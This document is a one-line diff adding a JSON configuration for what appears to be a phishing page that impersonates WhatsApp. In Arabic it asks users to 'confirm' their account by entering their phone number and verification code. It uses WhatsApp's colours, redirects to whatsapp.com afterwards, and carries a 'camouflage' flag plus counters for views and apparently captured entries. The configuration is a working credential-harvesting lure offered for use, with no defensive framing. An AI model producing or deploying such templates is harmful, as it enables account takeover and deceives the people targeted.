@@ -1,0 +1,1 @@
+{"active":true,"template":"wa","title":"✅ تأكيد رقم واتساب","desc":"أدخل بياناتك لتأكيد حسابك","fields":[{"label":"رقم الهاتف","type":"number"},{"label":"رمز التحقق","type":"number"}],"timer":5,"social":"","redirect":"https://www.whatsapp.com","camouflage":false,"bgColor":"#075e54","btnColor":"#25d366","btnText":"تأكيد ✅","logo":null,"views":12,"clipCount":4,"accent":"#dcf8c6"}
